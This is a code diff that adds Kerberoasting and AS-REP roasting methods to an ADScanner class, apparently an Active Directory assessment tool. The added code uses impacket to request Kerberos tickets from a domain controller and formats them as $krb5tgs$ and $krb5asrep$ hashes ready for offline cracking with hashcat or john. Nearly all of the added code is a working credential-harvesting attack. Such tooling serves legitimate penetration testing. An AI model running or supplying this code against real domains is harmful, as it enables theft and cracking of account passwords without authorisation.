@@ -332,6 +332,132 @@ class ADScanner:
         self._findings.extend(findings)
         return findings
 
+    async def extract_kerberoastable_hashes(
+        self,
+        dc_ip: str,
+        username: str,
+        password: str,
+        domain: str | None = None,
+    ) -> list[str]:
+        """
+        Request TGS tickets for all roastable SPNs and return $krb5tgs$ hashes
+        ready for hashcat/john. Requires impacket and valid credentials.
+        """
+        if not HAS_IMPACKET:
+            logger.warning("impacket not installed — cannot extract Kerberoast hashes")
+            return []
+        if not self._domain_info.spn_accounts:
+            await self.check_kerberoasting()
+
+        target_domain = domain or self.domain
+        hashes: list[str] = []
+
+        try:
+            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+            from impacket.krb5.types import Principal
+            from impacket.krb5 import constants as krb5_constants
+            import asyncio
+
+            loop = asyncio.get_event_loop()
+
+            def _get_tgt():
+                user_principal = Principal(
+                    username, type=krb5_constants.PrincipalNameType.NT_PRINCIPAL.value
+                )
+                tgt, cipher, old_session_key, session_key = getKerberosTGT(
+                    user_principal, password, target_domain,
+                    None, None, None, dc_ip,
+                )
+                return tgt, cipher, old_session_key, session_key
+
+            tgt, cipher, old_session_key, session_key = await loop.run_in_executor(None, _get_tgt)
+
+            for account in self._domain_info.spn_accounts:
+                for spn in account.get("spns", []):
+                    try:
+                        def _get_tgs(spn=spn):
+                            server_principal = Principal(
+                                spn, type=krb5_constants.PrincipalNameType.NT_SRV_INST.value
+                            )
+                            tgs, enc_key, old_session_key2, session_key2 = getKerberosTGS(
+                                server_principal, target_domain, None,
+                                tgt, cipher, session_key,
+                            )
+                            return tgs
+
+                        tgs = await loop.run_in_executor(None, _get_tgs)
+                        # Format as hashcat $krb5tgs$23$ hash
+                        from impacket.krb5.crypto import _enctype_table
+                        enc_type = tgs["ticket"]["enc-part"]["etype"]
+                        cipher_text = bytes(tgs["ticket"]["enc-part"]["cipher"])
+                        hash_str = (
+                            f"$krb5tgs${enc_type}$*{account['username']}${target_domain}${spn}*"
+                            f"${cipher_text[:16].hex()}${cipher_text[16:].hex()}"
+                        )
+                        hashes.append(hash_str)
+                    except Exception as spn_err:
+                        logger.debug(f"TGS request failed for {spn}: {spn_err}")
+
+        except Exception as exc:
+            logger.error(f"Kerberoast hash extraction failed: {exc}")
+
+        return hashes
+
+    async def extract_asrep_hashes(
+        self,
+        dc_ip: str,
+        domain: str | None = None,
+    ) -> list[str]:
+        """
+        Extract $krb5asrep$ hashes for accounts with pre-auth disabled.
+        No credentials required.
+        """
+        if not HAS_IMPACKET:
+            logger.warning("impacket not installed — cannot extract AS-REP hashes")
+            return []
+        if not self._domain_info.asrep_accounts:
+            await self.check_asrep_roasting()
+
+        target_domain = domain or self.domain
+        hashes: list[str] = []
+
+        try:
+            from impacket.krb5.kerberosv5 import getKerberosTGT
+            from impacket.krb5.types import Principal
+            from impacket.krb5 import constants as krb5_constants
+            import asyncio
+
+            loop = asyncio.get_event_loop()
+
+            for account in self._domain_info.asrep_accounts:
+                username = account["username"]
+                try:
+                    def _get_asrep(uname=username):
+                        user_principal = Principal(
+                            uname, type=krb5_constants.PrincipalNameType.NT_PRINCIPAL.value
+                        )
+                        # Empty password triggers AS-REP without pre-auth
+                        tgt, cipher, old_session_key, session_key = getKerberosTGT(
+                            user_principal, "", target_domain,
+                            None, None, None, dc_ip,
+                        )
+                        return tgt, cipher
+
+                    tgt, cipher = await loop.run_in_executor(None, _get_asrep)
+                    enc_part = bytes(tgt["enc-part"]["cipher"])
+                    hash_str = (
+                        f"$krb5asrep$23${username}@{target_domain}:"
+                        f"{enc_part[:16].hex()}${enc_part[16:].hex()}"
+                    )
+                    hashes.append(hash_str)
+                except Exception as acc_err:
+                    logger.debug(f"AS-REP request failed for {username}: {acc_err}")
+
+        except Exception as exc:
+            logger.error(f"AS-REP hash extraction failed: {exc}")
+
+        return hashes
+
     async def check_dcsync_rights(self) -> list[ADFinding]:
         """Check for non-DC accounts with DCSync replication rights (T1003.006)."""
         logger.info("Checking for DCSync rights...")
